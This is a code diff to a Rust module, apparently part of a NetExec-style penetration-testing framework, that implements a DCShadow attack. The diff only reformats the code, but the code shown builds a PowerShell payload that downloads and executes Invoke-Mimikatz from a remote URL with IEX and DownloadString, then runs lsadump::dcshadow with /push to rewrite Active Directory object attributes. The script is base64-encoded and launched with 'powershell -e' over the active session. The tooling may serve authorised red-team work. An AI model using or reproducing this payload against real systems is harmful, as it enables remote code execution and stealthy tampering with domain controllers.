@@ -78,12 +78,9 @@ impl NxcModule for DcshadowModule {
         let target_object = opts
             .get("TARGET_OBJECT")
             .ok_or_else(|| anyhow::anyhow!("TARGET_OBJECT option is required"))?;
-        let attribute = opts
-            .get("ATTRIBUTE")
-            .ok_or_else(|| anyhow::anyhow!("ATTRIBUTE option is required"))?;
-        let value = opts
-            .get("VALUE")
-            .ok_or_else(|| anyhow::anyhow!("VALUE option is required"))?;
+        let attribute =
+            opts.get("ATTRIBUTE").ok_or_else(|| anyhow::anyhow!("ATTRIBUTE option is required"))?;
+        let value = opts.get("VALUE").ok_or_else(|| anyhow::anyhow!("VALUE option is required"))?;
         let mimi_url = opts
             .get("MIMIKATZ_URL")
             .map(|s| s.as_str())
@@ -94,26 +91,22 @@ impl NxcModule for DcshadowModule {
             r#"
 $ErrorActionPreference = 'Stop';
 try {{
-    IEX (New-Object Net.WebClient).DownloadString("{}");
-    $output = Invoke-Mimikatz -Command "`"lsadump::dcshadow /object:{} /attribute:{} /value:{} /push`"";
+    IEX (New-Object Net.WebClient).DownloadString("{mimi_url}");
+    $output = Invoke-Mimikatz -Command "`"lsadump::dcshadow /object:{target_object} /attribute:{attribute} /value:{value} /push`"";
     Write-Output "DCShadow Output:";
     Write-Output $output;
 }} catch {{
     Write-Output 'DEBUG_ERR: Failed to execute DCShadow payload.';
     Write-Output $_.Exception.Message;
 }}
-"#,
-            mimi_url, target_object, attribute, value
+"#
         );
 
         let b64_script = base64::Engine::encode(
             &base64::engine::general_purpose::STANDARD,
-            script
-                .encode_utf16()
-                .flat_map(|u| u.to_le_bytes())
-                .collect::<Vec<u8>>(),
+            script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>(),
         );
-        let cmd = format!("powershell -e {}", b64_script);
+        let cmd = format!("powershell -e {b64_script}");
 
         // Execute via the active protocol
         let output = match session.protocol() {
